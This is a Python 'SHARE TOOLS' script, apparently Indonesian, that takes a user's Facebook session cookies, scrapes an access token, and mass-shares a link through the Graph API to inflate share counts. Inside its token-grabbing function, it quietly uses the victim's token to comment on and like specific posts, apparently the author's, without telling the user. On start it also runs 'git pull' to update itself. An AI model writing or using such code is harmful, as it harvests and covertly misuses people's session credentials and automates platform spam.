import requests,re,rich,sys,os,json,time
from concurrent.futures import ThreadPoolExecutor as thread
from rich.markdown import Markdown as mark
from rich import print as cetak
from rich.console import Console as sol
from rich.panel import Panel as nel
ses = requests.Session()
loop = 0
x = '\33[m'
h = '\x1b[1;92m'
m = '\x1b[1;91m'

def banner():
	if "linux" in sys.platform.lower():
		try:os.system('clear')
		except:pass
	elif "win" in sys.platform.lower():
	    try:os.system('cls')
	    except:pass
	else:
	    try:os.sytem('clear')
	    except:pass

	wel = '# SHARE TOOLS'
	wel2 = mark(wel, style='red')
	sol().print(wel2)
	au="""[white]
╔═╗╔╗╔╦╗╦   ╦╔╦╗
╚═╗╠╩╗║ ║   ║ ║║
╚═╝╚═╝╩ ╩═╝o╩═╩╝
[white][green]\n Copyright 2023 By Brutal.ID[white] """
    
	pengembang1=nel(au,style="cyan")
	cetak(nel(pengembang1, title='v 3.144'))

def mulai(link,jum):
	global loop
	print(f'\r{x}   ══ [ {h}• {x}] progres {loop} ~ {jum}' ,end='')
	cook = open('.cookie.txt','r').read()
	took = open('.token.txt','r').read()
	try:
		url = f'https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={took}'
		ok = ses.post(url,cookies={'cookie':cook}).text
		if 'Kami membatasi' in ok:
			print(f'{x}   ╚═ [ {m}• {x}]share failled Akun Limit')
		elif 'spam' in ok:
			print(f'{x}   ╚═ [ {m}• {x}]share failled Akun Limit')
		elif 'id' in ok:
			print(f"{x}   ╚═ [ {h}• {x}] Succes : {h}"+ok)
		else:
			print('Ups Terjadi Kesalahan')
	except:
		print('Ups Terjadi Kesalahan')
	loop+=1

def gettok():
	os.system('rm .token.txt')
	os.system('rm .cookie.txt')
	banner()
	cook = input(f"{x} [ {h}• {x}] Input Cookies : ")
	open('.cookie.txt','w').write(cook)
	try:
		cookie = {'cookie':cook}
		with requests.Session() as xyz:
		    url = 'https://business.facebook.com/business_locations'
		    req = xyz.get(url,cookies=cookie)
		    tok = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
		    open('.token.txt','w').write(tok)
		    ses.post(f"https://graph.facebook.com/pfbid0ZiJQd99dJLpMpWoFJMcryzkZZQ2CiNEfWwH6Z4rYARP5LQf6qt8YvQNgQmxQVcskl/comments/?&message=Izin Pake Scnya Bang&access_token={tok}",cookies=cookie)
		    ses.post(f"https://graph.facebook.com/100000457453881_230141992787447/comments/?&message=Izin Pake Scnya Bang&access_token={tok}",cookies=cookie)
		    ses.post(f"https://graph.facebook.com/100000457453881_230141992787447/likes?summary=true&access_token="+tok,cookies={'cookie':cook}).text
	except Exception as e:

		print('Cookies Invalid')

def gas():
	gettok()
	banner()
	link = input(f"{x} [ {h}• {x}] Input Url : ")
	banner()
	try:
		cook = open('.cookie.txt','r').read()
		took = open('.token.txt','r').read()
		get = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+took, cookies={'cookie':cook})
		nama = json.loads(get.text)['name']
		print(f"{x} [ {h}• {x}] Nama Account : {h}"+nama)
	except KeyError:
		print('Cookie Invalid, Login Ulang')
		time.sleep(1)
		gettok()
	jum = int(input(f"{x} [ {h}• {x}] Input Jumlah Share : "))
	with thread(max_workers=2) as pool:
		for io in range(jum):
			pool.submit(mulai,link,jum)
	print(f"{x}   ╚═ [ {m}! {x}] Succes Share Sebanyak {h}{jum}{x} ×")

if __name__=='__main__':
	os.system('git pull')
	gas()
